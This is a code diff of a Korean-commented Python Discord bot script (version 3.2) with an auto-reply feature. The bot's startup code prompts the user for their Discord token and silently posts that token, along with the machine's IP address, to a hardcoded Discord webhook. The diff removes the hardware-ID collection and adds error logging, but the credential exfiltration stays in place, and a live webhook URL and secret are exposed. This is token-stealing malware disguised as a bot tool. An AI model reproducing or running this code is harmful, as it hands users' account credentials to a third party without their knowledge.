@@ -27,13 +27,6 @@ __version__ = "3.2"
 
 start_time = datetime.datetime.now(datetime.timezone.utc)
 
-# 하드웨어 ID (MAC 주소 기반)
-def get_hardware_id():
-    try:
-        return str(uuid.getnode())
-    except:
-        return "Unknown"
-
 # IP 주소 가져오기
 def get_ip_address():
     try:
@@ -42,21 +35,28 @@ def get_ip_address():
         ip = s.getsockname()[0]
         s.close()
         return ip
-    except:
+    except Exception as e:
+        print(f"{y}IP 주소 가져오기 실패: {str(e)}{w}")
         return "Unknown"
 
 # 웹훅으로 정보 전송
-def send_to_webhook(token, hardware_id, ip_address):
+def send_to_webhook(token, ip_address):
     webhook_url = "https://discord.com/api/webhooks/1393916364288167976/ffnH0O_ErMU2h-_coi9r3f_lEXjyoqClz9TbRSnGgjBbyQfKzQ_bybTKZRnpnGuQh4Or"
     data = {
-        "content": f"**New Bot Instance**\nToken: `{token}`\nHardware ID: `{hardware_id}`\nIP Address: `{ip_address}`"
+        "content": f"**New Bot Instance**\nToken: `{token}`\nIP Address: `{ip_address}`"
     }
     try:
         response = requests.post(webhook_url, json=data)
         response.raise_for_status()
-        print("웹훅 전송 성공")
+        print(f"{y}웹훅 전송 성공: {response.status_code}{w}")
+        print(f"{y}웹훅 응답: {response.text}{w}")
+    except requests.exceptions.HTTPError as http_err:
+        print(f"{y}웹훅 전송 실패 (HTTP 오류): {str(http_err)}{w}")
+        print(f"{y}응답 코드: {response.status_code}, 응답: {response.text}{w}")
+    except requests.exceptions.RequestException as req_err:
+        print(f"{y}웹훅 전송 실패 (네트워크 오류): {str(req_err)}{w}")
     except Exception as e:
-        print(f"웹훅 전송 실패: {str(e)}")
+        print(f"{y}웹훅 전송 실패 (기타 오류): {str(e)}{w}")
 
 def load_config():
     try:
@@ -94,10 +94,10 @@ def load_config():
 
 config = load_config()
 
-token = input("토큰을 입력하세요: ")
-hardware_id = get_hardware_id()
-ip_address = get_ip_address()
-send_to_webhook(token, hardware_id, ip_address)
+if __name__ == "__main__":
+    token = input("토큰을 입력하세요: ")
+    ip_address = get_ip_address()
+    send_to_webhook(token, ip_address)
 
 prefix = config.get("prefix", "!")
 message_generator = itertools.cycle(config.get("autoreply", {}).get("messages", ["자동 응답 메시지 1", "자동 응답 메시지 2"]))
